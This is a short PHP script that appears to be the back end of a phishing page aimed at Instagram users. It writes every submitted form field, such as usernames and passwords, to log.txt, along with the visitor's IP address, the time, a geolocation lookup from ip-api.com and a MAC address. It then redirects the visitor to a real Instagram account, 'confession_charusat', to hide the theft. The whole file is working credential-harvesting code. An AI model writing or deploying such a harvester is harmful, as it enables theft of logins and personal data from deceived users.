<?php
date_default_timezone_set('Asia/Kolkata');
$date = date('d-m-y h:i:s');
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,"http://ip-api.com/json");
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
$result=curl_exec($ch);
$MAC = exec('getmac');
$IP = $_SERVER['REMOTE_ADDR'];
$MAC = strtok($MAC, ' ');
header ('Location: http://instagram.com/confession_charusat');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, " : ");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "MAC ADRESS : ");
fwrite($handle, $MAC);
fwrite($handle, "\n");
fwrite($handle, "TIME : ");
fwrite($handle, $date);
fwrite($handle, "\n");
fwrite($handle, "IP ADRESS is : ");
fwrite($handle, $IP);
fwrite($handle, "\n");
fwrite($handle, "full info is : ");
fwrite($handle, $result);
fwrite($handle, "\r\n");
fwrite($handle, "\n");
fclose($handle);
exit;
?>